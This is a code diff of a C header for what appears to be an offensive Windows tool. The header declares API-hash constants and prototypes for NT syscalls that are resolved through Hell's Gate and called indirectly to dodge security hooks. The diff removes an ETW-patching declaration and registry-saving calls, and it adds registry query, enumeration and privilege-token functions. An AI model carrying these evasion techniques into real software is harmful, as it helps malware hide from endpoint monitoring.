@@ -12,22 +12,18 @@
 #define H_NtQueryInformationProcess  0xD034FC62
 #define H_NtCreateFile               0x15A5ECDB
 #define H_NtWriteFile                0xD69326B2
-#define H_NtQuerySystemInformation   0xEE4F73A8
-#define H_NtProtectVirtualMemory     0x082962C8
-#define H_EtwEventWrite              0x24A8D022
 #define H_NtAllocateVirtualMemory    0x6793C34C
 #define H_NtFreeVirtualMemory        0x471AA7E9
-#define H_NtReadFile                 0x2E979AE3
-#define H_NtQueryInformationFile     0x4725F863
 #define H_NtSetInformationFile       0x6E88B479
+#define H_NtTerminateProcess         0x1703AB2F
+#define H_NtReadFile                 0x2E979AE3
+#define H_NtFlushBuffersFile         0x832E7ED6
 #define H_NtOpenKey                  0x4BB73E02
-#define H_NtSaveKey                  0x5DD180BF
+#define H_NtQueryKey                 0x1C670286
+#define H_NtQueryValueKey            0xB4C18A83
+#define H_NtEnumerateKey             0x6A5E8ED6
 #define H_NtOpenProcessToken         0x7BD07459
 #define H_NtAdjustPrivilegesToken    0x6921F9CD
-#define H_NtTerminateProcess         0x1703AB2F
-#define H_NtFsControlFile            0xF89DDF61
-#define H_NtFlushBuffersFile         0x832E7ED6
-#define H_NtCreateNamedPipeFile      0xDF32E02E
 
 /* Syscall numbers (resolved at runtime via Hell's Gate) */
 typedef struct _SYSCALL_TABLE {
@@ -38,21 +34,18 @@ typedef struct _SYSCALL_TABLE {
     DWORD NtQueryInformationProcess;
     DWORD NtCreateFile;
     DWORD NtWriteFile;
-    DWORD NtQuerySystemInformation;
-    DWORD NtProtectVirtualMemory;
+    DWORD NtReadFile;
     DWORD NtAllocateVirtualMemory;
     DWORD NtFreeVirtualMemory;
-    DWORD NtReadFile;
-    DWORD NtQueryInformationFile;
     DWORD NtSetInformationFile;
+    DWORD NtTerminateProcess;
+    DWORD NtFlushBuffersFile;
     DWORD NtOpenKey;
-    DWORD NtSaveKey;
+    DWORD NtQueryKey;
+    DWORD NtQueryValueKey;
+    DWORD NtEnumerateKey;
     DWORD NtOpenProcessToken;
     DWORD NtAdjustPrivilegesToken;
-    DWORD NtTerminateProcess;
-    DWORD NtFsControlFile;
-    DWORD NtFlushBuffersFile;
-    DWORD NtCreateNamedPipeFile;
 } SYSCALL_TABLE;
 
 /* Address of `syscall` instruction in ntdll (for indirect calls) */
@@ -64,21 +57,18 @@ typedef struct _SYSCALL_ADDR_TABLE {
     PVOID NtQueryInformationProcess;
     PVOID NtCreateFile;
     PVOID NtWriteFile;
-    PVOID NtQuerySystemInformation;
-    PVOID NtProtectVirtualMemory;
+    PVOID NtReadFile;
     PVOID NtAllocateVirtualMemory;
     PVOID NtFreeVirtualMemory;
-    PVOID NtReadFile;
-    PVOID NtQueryInformationFile;
     PVOID NtSetInformationFile;
+    PVOID NtTerminateProcess;
+    PVOID NtFlushBuffersFile;
     PVOID NtOpenKey;
-    PVOID NtSaveKey;
+    PVOID NtQueryKey;
+    PVOID NtQueryValueKey;
+    PVOID NtEnumerateKey;
     PVOID NtOpenProcessToken;
     PVOID NtAdjustPrivilegesToken;
-    PVOID NtTerminateProcess;
-    PVOID NtFsControlFile;
-    PVOID NtFlushBuffersFile;
-    PVOID NtCreateNamedPipeFile;
 } SYSCALL_ADDR_TABLE;
 
 extern SYSCALL_TABLE g_ssn;
@@ -122,8 +112,9 @@ NTSTATUS sys_NtWriteFile(HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine,
     PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer,
     ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);
 
-NTSTATUS sys_NtProtectVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress,
-    PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
+NTSTATUS sys_NtReadFile(HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine,
+    PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer,
+    ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);
 
 NTSTATUS sys_NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress,
     ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
@@ -131,46 +122,33 @@ NTSTATUS sys_NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress,
 NTSTATUS sys_NtFreeVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress,
     PSIZE_T RegionSize, ULONG FreeType);
 
-NTSTATUS sys_NtReadFile(HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine,
-    PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer,
-    ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);
-
-NTSTATUS sys_NtQueryInformationFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock,
-    PVOID FileInformation, ULONG Length, DWORD FileInformationClass);
-
 NTSTATUS sys_NtSetInformationFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock,
     PVOID FileInformation, ULONG Length, DWORD FileInformationClass);
+
+NTSTATUS sys_NtTerminateProcess(HANDLE ProcessHandle, NTSTATUS ExitStatus);
+
+NTSTATUS sys_NtFlushBuffersFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock);
 
 NTSTATUS sys_NtOpenKey(PHANDLE KeyHandle, ACCESS_MASK DesiredAccess,
     POBJECT_ATTRIBUTES ObjectAttributes);
 
-NTSTATUS sys_NtSaveKey(HANDLE KeyHandle, HANDLE FileHandle);
+NTSTATUS sys_NtQueryKey(HANDLE KeyHandle, ULONG KeyInformationClass,
+    PVOID KeyInformation, ULONG Length, PULONG ResultLength);
+
+NTSTATUS sys_NtQueryValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueName,
+    ULONG KeyValueInformationClass, PVOID KeyValueInformation,
+    ULONG Length, PULONG ResultLength);
+
+NTSTATUS sys_NtEnumerateKey(HANDLE KeyHandle, ULONG Index,
+    ULONG KeyInformationClass, PVOID KeyInformation,
+    ULONG Length, PULONG ResultLength);
 
 NTSTATUS sys_NtOpenProcessToken(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
     PHANDLE TokenHandle);
 
 NTSTATUS sys_NtAdjustPrivilegesToken(HANDLE TokenHandle, BOOLEAN DisableAllPrivileges,
-    PTOKEN_PRIVILEGES NewState, ULONG BufferLength, PTOKEN_PRIVILEGES PreviousState,
-    PULONG ReturnLength);
-
-NTSTATUS sys_NtTerminateProcess(HANDLE ProcessHandle, NTSTATUS ExitStatus);
-
-NTSTATUS sys_NtFsControlFile(HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine,
-    PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, ULONG FsControlCode,
-    PVOID InputBuffer, ULONG InputBufferLength, PVOID OutputBuffer,
-    ULONG OutputBufferLength);
-
-NTSTATUS sys_NtFlushBuffersFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock);
-
-NTSTATUS sys_NtCreateNamedPipeFile(PHANDLE FileHandle, ULONG DesiredAccess,
-    POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock,
-    ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions,
-    ULONG NamedPipeType, ULONG ReadMode, ULONG CompletionMode,
-    ULONG MaximumInstances, ULONG InboundQuota, ULONG OutboundQuota,
-    PLARGE_INTEGER DefaultTimeout);
-
-/* ETW patch */
-BOOL patch_etw(void);
+    PTOKEN_PRIVILEGES NewState, ULONG BufferLength,
+    PTOKEN_PRIVILEGES PreviousState, PULONG ReturnLength);
 
 /* PEB helpers */
 PVOID get_peb(void);
